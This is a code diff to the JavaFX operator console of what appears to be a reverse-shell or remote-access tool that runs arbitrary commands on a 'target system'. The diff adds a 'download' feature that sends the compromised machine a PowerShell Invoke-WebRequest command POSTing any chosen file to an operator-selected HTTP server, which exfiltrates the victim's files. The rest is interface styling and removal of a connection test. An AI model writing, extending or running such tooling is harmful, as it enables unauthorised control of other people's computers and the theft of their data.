@@ -16,6 +16,8 @@ import javafx.geometry.Pos;
 import javafx.collections.FXCollections;
 import javafx.stage.Modality;
 import javafx.scene.control.ListCell;
+import javafx.stage.DirectoryChooser;
+import javafx.scene.layout.HBox;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -49,6 +51,7 @@ public class ConsoleTab extends Tab {
             "----------Only Server Side Commands----------\n" +
             "- help             : Display this help message\n" +
             "- upload           : Upload a file to the target system\n" +
+            "- download         : Download a file using HTTP server\n" +
             "- clear            : Clear the console\n" +
             "- exit/quit        : Close the connection\n" +
             "Any other input will be executed as a command on the target system.";
@@ -67,7 +70,7 @@ public class ConsoleTab extends Tab {
     private static final String DRACULA_YELLOW = "#f1fa8c";
 
     // Commandes locales (traitées uniquement côté serveur)
-    private static final List<String> LOCAL_COMMANDS = List.of("help", "upload", "clear", "exit", "quit");
+    private static final List<String> LOCAL_COMMANDS = List.of("help", "upload", "download", "clear", "exit", "quit");
 
     public ConsoleTab(ShellSession session, Main mainApp) {
         super(); // Appel au constructeur parent Tab
@@ -95,9 +98,7 @@ public class ConsoleTab extends Tab {
             appendToConsole("[+] OS: " + session.getOs(), DRACULA_GREEN);
             appendToConsole("[+] Use 'help' to see available commands", DRACULA_CYAN);
             appendSeparator(COMMAND_SEPARATOR, DRACULA_PURPLE);
-            
-            // Tester la connexion automatiquement
-            testConnection();
+
         });
     }
 
@@ -206,6 +207,8 @@ public class ConsoleTab extends Tab {
             closeSession();
         } else if (command.equalsIgnoreCase("upload")) {
             showUploadWindow();
+        } else if (command.equalsIgnoreCase("download")) {
+            showDownloadWindow();
         } else {
             // Envoyer toute autre commande au client
             sendCommand(command);
@@ -280,23 +283,6 @@ public class ConsoleTab extends Tab {
         responseThread.setDaemon(true);
         responseThread.start();
         
-        System.out.println("[DEBUG] Thread d'écoute démarré");
-    }
-
-    // Forcer l'envoi d'une commande de test pour vérifier la connexion
-    public void testConnection() {
-        try {
-            PrintWriter out = session.getOut();
-            if (out != null) {
-                out.println("echo CONNECTION_TEST");
-                out.flush();
-                appendToConsole("[*] Sent connection test...", DRACULA_PURPLE);
-            } else {
-                appendToConsole("[!] Cannot test connection - output stream is null", DRACULA_RED);
-            }
-        } catch (Exception e) {
-            appendToConsole("[!] Connection test failed: " + e.getMessage(), DRACULA_RED);
-        }
     }
 
     public boolean isSocketActive() {
@@ -583,5 +569,150 @@ public class ConsoleTab extends Tab {
     
     public ShellSession getSession() {
         return session;
+    }
+
+    private void showDownloadWindow() {
+        Stage stageDownload = new Stage();
+        stageDownload.initModality(Modality.APPLICATION_MODAL);
+        stageDownload.setTitle("Download File");
+        
+        // Définir une taille minimale pour la fenêtre
+        stageDownload.setMinWidth(500);
+        stageDownload.setMinHeight(350);
+        
+        Label serverLabel = new Label("Select Download Server");
+        serverLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
+        
+        // Filtrer uniquement les serveurs de type Download
+        ComboBox<Main.ServerEntry> serverComboBox = new ComboBox<>();
+        serverComboBox.setItems(FXCollections.observableArrayList(
+            mainApp.getServerList().filtered(server -> "Download".equals(server.getType()))
+        ));
+        serverComboBox.setPrefWidth(300);
+        
+        // Améliorer l'affichage des serveurs dans la ComboBox
+        serverComboBox.setCellFactory(param -> new ListCell<Main.ServerEntry>() {
+            @Override
+            protected void updateItem(Main.ServerEntry item, boolean empty) {
+                super.updateItem(item, empty);
+                if (empty || item == null) {
+                    setText(null);
+                } else {
+                    setText(item.getIp() + ":" + item.getPort());
+                }
+            }
+        });
+        
+        serverComboBox.setButtonCell(new ListCell<Main.ServerEntry>() {
+            @Override
+            protected void updateItem(Main.ServerEntry item, boolean empty) {
+                super.updateItem(item, empty);
+                if (empty || item == null) {
+                    setText(null);
+                } else {
+                    setText(item.getIp() + ":" + item.getPort());
+                }
+            }
+        });
+        
+        Label fileLabel = new Label("Remote File Path");
+        fileLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
+        
+        TextField filePathField = new TextField();
+        filePathField.setPromptText("Enter the path of the file on the remote system");
+        filePathField.setPrefWidth(300);
+        applyDraculaTextStyle(filePathField);
+        
+        Label saveLabel = new Label("Local Save Location");
+        saveLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
+        
+        TextField saveLocationField = new TextField();
+        saveLocationField.setPromptText("Select where to save the file locally");
+        saveLocationField.setPrefWidth(300);
+        applyDraculaTextStyle(saveLocationField);
+        
+        Button chooseSaveLocationButton = new Button("Browse");
+        applyDraculaButtonStyle(chooseSaveLocationButton);
+        
+        chooseSaveLocationButton.setOnAction(e -> {
+            FileChooser fileChooser = new FileChooser();
+            fileChooser.setTitle("Save File As");
+            
+            // Si un nom de fichier distant est spécifié, l'utiliser comme nom par défaut
+            String remoteFile = filePathField.getText().trim();
+            if (!remoteFile.isEmpty()) {
+                String fileName = new File(remoteFile).getName();
+                fileChooser.setInitialFileName(fileName);
+            }
+            
+            File selectedFile = fileChooser.showSaveDialog(stageDownload);
+            if (selectedFile != null) {
+                saveLocationField.setText(selectedFile.getAbsolutePath());
+            }
+        });
+        
+        Button downloadButton = new Button("Download");
+        applyDraculaButtonStyle(downloadButton);
+        downloadButton.setOnAction(e -> {
+            Main.ServerEntry selectedServer = serverComboBox.getSelectionModel().getSelectedItem();
+            String remotePath = filePathField.getText().trim();
+            String localPath = saveLocationField.getText().trim();
+            
+            if (selectedServer != null && !remotePath.isEmpty() && !localPath.isEmpty()) {
+                String command = String.format(
+                    "powershell Invoke-WebRequest -Uri \"http://%s:%d/%s\" -Method POST -InFile \"%s\" -ContentType \"application/octet-stream\"",
+                    selectedServer.getIp(),
+                    selectedServer.getPort(),
+                    new File(remotePath).getName(),
+                    remotePath
+                );
+                
+                sendCommand(command);
+                stageDownload.close();
+            }
+        });
+        
+        // Créer un HBox pour le champ de sauvegarde et le bouton Browse
+        HBox saveLocationBox = new HBox(10);
+        saveLocationBox.getChildren().addAll(saveLocationField, chooseSaveLocationButton);
+        
+        VBox layout = new VBox(15);
+        layout.setPadding(new Insets(20));
+        layout.getChildren().addAll(
+            serverLabel, 
+            serverComboBox,
+            fileLabel, 
+            filePathField,
+            saveLabel,
+            saveLocationBox,
+            downloadButton
+        );
+        layout.setStyle("-fx-background-color: " + DRACULA_BACKGROUND + ";");
+        
+        Scene scene = new Scene(layout);
+        stageDownload.setScene(scene);
+        stageDownload.showAndWait();
+    }
+
+    private void applyDraculaButtonStyle(Button button) {
+        button.setStyle(
+            "-fx-background-color: " + DRACULA_PURPLE + ";" +
+            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
+            "-fx-font-weight: bold;" +
+            "-fx-padding: 8px 16px;" +
+            "-fx-cursor: hand;"
+        );
+    }
+
+    private void applyDraculaTextStyle(TextField textField) {
+        textField.setStyle(
+            "-fx-font-family: 'Monospace';" +
+            "-fx-font-size: 12px;" +
+            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
+            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
+            "-fx-highlight-fill: " + DRACULA_PURPLE + ";" +
+            "-fx-highlight-text-fill: " + DRACULA_FOREGROUND + ";" +
+            "-fx-prompt-text-fill: " + DRACULA_COMMENT + ";"
+        );
     }
 }
